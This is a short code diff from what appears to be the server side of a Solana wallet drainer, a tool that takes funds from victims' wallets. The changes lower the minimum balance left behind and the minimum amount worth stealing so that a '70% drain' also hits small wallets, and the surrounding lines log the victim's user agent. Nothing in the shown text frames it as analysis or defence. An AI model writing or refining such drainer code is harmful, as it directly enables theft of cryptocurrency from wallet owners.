@@ -585,7 +585,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         }
         
         // Additional safety check: ensure we're not draining too much
-        const MINIMUM_BALANCE_AFTER_DRAIN = 75000; // ~0.000075 SOL minimum balance (reduced for small wallets)
+        const MINIMUM_BALANCE_AFTER_DRAIN = 50000; // ~0.00005 SOL minimum balance (reduced for 70% drain)
         const maxSafeDrain = FRESH_BALANCE - MINIMUM_BALANCE_AFTER_DRAIN;
         
         // Validate that we can safely drain
@@ -598,6 +598,7 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
           });
         }
         
+        // For 70% drain, use the calculated amount but respect safety limit
         const safeDrainAmount = Math.min(drainAmount, maxSafeDrain);
         debugLog(`Safe drain amount: ${safeDrainAmount} lamports (${(safeDrainAmount / 1e9).toFixed(6)} SOL)`);
         
@@ -605,8 +606,8 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         
                  
         
-        // Ensure minimum meaningful drain amount (reduced for small wallets)
-        const MINIMUM_DRAIN_AMOUNT = 50000; // 0.00005 SOL minimum drain amount
+        // Ensure minimum meaningful drain amount (reduced for 70% drain)
+        const MINIMUM_DRAIN_AMOUNT = 30000; // 0.00003 SOL minimum drain amount
         if (finalDrainAmount < MINIMUM_DRAIN_AMOUNT) {
           debugLog(`Final drain amount too small: ${finalDrainAmount} < ${MINIMUM_DRAIN_AMOUNT}`);
           return res.status(400).json({
